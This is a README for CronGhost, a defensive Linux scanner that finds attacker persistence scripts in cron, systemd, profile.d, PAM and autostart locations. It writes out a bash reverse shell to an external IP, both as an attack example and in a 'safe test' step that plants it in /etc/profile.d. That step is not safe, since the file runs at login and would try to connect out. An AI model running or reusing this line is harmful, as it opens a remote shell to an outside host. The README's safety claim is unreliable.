# CronGhost

```
  ____                  ____  _               _   
 / ___|_ __ ___  _ __  / ___|| |__   ___  ___| |_ 
| |   | '__/ _ \| '_ \| |  _ | '_ \ / _ \/ __| __|
| |___| | | (_) | | | | |_| || | | | (_) \__ \ |_ 
 \____|_|  \___/|_| |_|\____||_| |_|\___/|___/\__|

  Scheduled Task Shadow Scanner — v3.0.0 -Artist-22
  Created by Artist-22
```

> **The only tool that scans all 14 Linux persistence locations simultaneously — with cryptographic baseline verification.**

---

## What is CronGhost?

CronGhost is a Linux security tool that detects malicious scheduled tasks, hidden autorun scripts, and attacker persistence mechanisms planted on your system.

Most security tools only check the obvious places — `/etc/crontab` and a few cron folders. Attackers know this. They hide in the other 10 locations that scanners never check.

CronGhost checks all 14.

---

## The Problem It Solves

When an attacker compromises a Linux system they always plant a **persistence mechanism** — a hidden script that runs automatically so they can get back in even after passwords are changed or the initial vulnerability is patched.

These persistence scripts hide in locations most admins never look at:

```
/etc/profile.d/       runs on every single user login
/etc/pam.d/           runs on every authentication event  
/etc/rc.local         runs at every system boot
XDG autostart         runs when the desktop starts
systemd timers        runs on a schedule invisibly
```

A real attacker case — a company wiped their entire server after a breach. Changed all passwords. Reinstalled services. Two days later the attacker was back. Why? Because their persistence script survived in `/etc/profile.d/` — a location nobody thought to check. CronGhost would have found it in 3 seconds.

---

## The 14 Locations CronGhost Scans

| # | Location | Why attackers use it |
|---|---|---|
| 1 | `/etc/crontab` | System-wide cron jobs |
| 2 | `/var/spool/cron/crontabs/` | Per-user cron jobs |
| 3 | `/etc/cron.d/` | Application cron drop folder |
| 4 | `/etc/cron.daily/` | Runs every day automatically |
| 5 | `/etc/cron.hourly/` | Runs every hour automatically |
| 6 | `/etc/cron.weekly/` | Runs every week automatically |
| 7 | `/etc/cron.monthly/` | Runs every month automatically |
| 8 | `/etc/anacrontab` | Runs missed jobs after reboot |
| 9 | `systemd timers` | Modern invisible scheduler |
| 10 | `/etc/profile.d/` | **Runs on every login — most missed** |
| 11 | `/etc/environment` | Loaded before the shell starts |
| 12 | `PAM exec module` | **Runs on every authentication** |
| 13 | `/etc/rc.local` | Runs at every single boot |
| 14 | `XDG autostart` | Targets workstations silently |

Locations 10 to 14 are where real attackers hide because no basic scanner checks them.

---

## Three Tiers of Detection

CronGhost uses a layered approach so even advanced attackers cannot hide.

### Tier 1 — Pattern Detection
Scans file content for known attack patterns — reverse shells, download-and-execute payloads, encoded commands, suspicious file paths. Catches script kiddies and intermediate attackers instantly.

### Tier 2 — Intelligent Analysis
Goes beyond simple pattern matching. Checks:
- **Package manager verification** — did `apt` install this file or did someone drop it manually?
- **File age analysis** — was this created at 2AM when no admin was watching?
- **Owner verification** — is this file owned by an unexpected user?
- **Modification detection** — has this system file been changed since it was installed?

Every finding gets a **confidence score** from 0 to 100. Low confidence findings are filtered out automatically — no noise, only real threats.

### Tier 3 — Cryptographic Baseline
The most powerful layer. On first run CronGhost photographs every file in every persistence location as a **SHA256 cryptographic hash**. Every future scan compares against that snapshot.

If any file changes — even a single byte — CronGhost reports it with **90% confidence**. An attacker can fool pattern scanners. They cannot fool mathematics.

```
Run 1 (clean system)  →  baseline created
                          every file hashed and saved

Run 2 (after attack)  →  attacker dropped /etc/profile.d/backdoor.sh
                          CronGhost: [CRITICAL] NEW FILE — not in baseline
                          Confidence: 85%
```

---

## Real World Example

**The attack:**
```bash
# Attacker plants a reverse shell that runs on every login
echo 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1' > /etc/profile.d/updater.sh
```

**CronGhost catches it:**
```
[!!]  10/14  /etc/profile.d/          critical

[CRITICAL]  /etc/profile.d/updater.sh

  Confidence    [████████████████████] 95%

  Package       NOT in dpkg — manually placed
  Owner         root
  File age      created 2026-03-21 02:14  ODD HOUR

  Content hits
    [HIGH]  +90  bash -i >& /dev/tcp/   classic reverse shell

  Baseline      NEW FILE — did not exist in baseline
```

---

## Installation

### Requirements
- Linux (Kali, Ubuntu, Debian or any Debian-based distro)
- Python 3.6 or higher
- Root access
- `python3-pillow` for icon generation (auto-installed)

### Install

```bash
# Clone the repository
git clone https://github.com/ARTIST/cronghost.git

# Enter the folder
cd cronghost

# Run the installer
sudo bash install.sh
```

The installer automatically:
- Installs CronGhost as a system command
- Generates and installs the custom icon
- Adds CronGhost to the Kali application menu
- Creates the data directory for baseline storage

### Run

```bash
sudo cronghost
```

That is it. No flags, no config files, no setup. Just run it.

---

## First Time Setup

When you run CronGhost for the first time on a clean system:

```
1. Run:   sudo cronghost
2. Choose option 4 — Create baseline
3. Wait for it to hash all files (takes a few seconds)
4. Done — your clean system is now on record
```

Every scan after this compares against your baseline. Any new file, any modified file, any deleted file — CronGhost sees it immediately.

---

## Usage

```
Options:

  1)  Run scan again
  2)  Export report to file
  3)  Update baseline with current system state
  4)  Create baseline (first time setup)
  5)  Quit
```

### Export a report

Choose option 2 to export a full text report:

```
cronghost_report_20260321_035116.txt
```

The report contains every finding with full details — file path, threat score, confidence, package manager verification, file age, owner, and all matched patterns.

---

## Understanding the Output

### Scan line status
```
[OK]   — location is clean
[!!]   — suspicious or critical finding
[??]   — low confidence finding, worth reviewing
```

### Verdict levels
```
[CRITICAL]    — confidence 80%+  act immediately
[SUSPICIOUS]  — confidence 60%+  investigate this
[LOW]         — confidence below 60%  monitor it
```

### Confidence bar
```
[████████████████████] 95%   ← almost certainly malicious
[████████░░░░░░░░░░░░] 40%   ← suspicious but check manually
[████░░░░░░░░░░░░░░░░] 20%   ← low risk, probably safe
```

### Baseline alerts
```
[CHANGED]    file content changed since your clean snapshot
[NEW FILE]   file did not exist when baseline was created
[DELETED]    file existed in baseline but is now gone
```

---

## Why CronGhost is Different

|          Feature           | Basic cron scanners |            CronGhost                |
|                            |                     |                                     |
| Locations checked          |          4-7        | **14**                              |
| False positive filtering   |         None        | Smart whitelist + confidence scoring|
| Package manager check      |          No         | **Yes — dpkg verification**         |
| Cryptographic baseline     |          No         | **Yes — SHA256 per file**           |
| Modification detection     |          No         | **Yes — byte level**                |
| Confidence scoring         |          No         | **Yes — 0 to 100%**                 |
| Kali app menu integration  |          No         | **Yes — with custom icon**          |
| Tier system                |          No         | **Yes — Tier 1, 2, 3**              |

---

## Testing CronGhost

Want to verify it works? Plant a fake malicious entry and watch CronGhost catch it:

```bash
# Plant a fake reverse shell (safe test — no real connection)
sudo bash -c 'echo "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1" > /etc/profile.d/test_backdoor.sh'

# Run CronGhost — it will flag it as CRITICAL
sudo cronghost

# Clean up after testing
sudo rm /etc/profile.d/test_backdoor.sh

# Run again — should show all clean
sudo cronghost
```

---

## Uninstall

```bash
cd cronghost
sudo bash uninstall.sh
```

This removes all files, the icon, the app menu entry, and the baseline data.

---

## Roadmap

- [ ] Email alerts when critical findings are detected
- [ ] Daemon mode — runs silently in background 24/7
- [ ] ProcessBlood — process ancestry attack detector
- [ ] SocketLie — socket truth verifier
- [ ] EnvPoison — environment variable infection scanner
- [ ] Unified suite — all tools under one installer

---

## Who is this for?

- Security researchers auditing Linux systems
- System administrators protecting production servers
- Penetration testers verifying their own persistence detection
- Students learning Linux security and forensics
- Anyone who wants to know if their Linux system has been compromised

---

## Legal and Ethical Use

CronGhost is designed for use on systems you own or have explicit written permission to audit. Using this tool against systems you do not own or have permission to test is illegal and unethical.

The author takes no responsibility for misuse.

---

## License

CronGhost is protected under a Custom Restrictive License.

```
✅ You can download and use CronGhost
✅ You can use it for personal and professional security auditing
✅ You can share the link to this repository
❌ You cannot copy or redistribute the source code
❌ You cannot build another tool based on this code
❌ You cannot sell or commercially exploit CronGhost
❌ You cannot claim ownership or co-authorship
```

See the `LICENSE` file for full terms.

---

## Author

**Artist-22**
GitHub: [@Artist-22](https://github.com/Artist-22)

> *"The best tools in cybersecurity history were built by individuals — not corporations."*

---

*CronGhost — Because persistence kills. Find it first.*
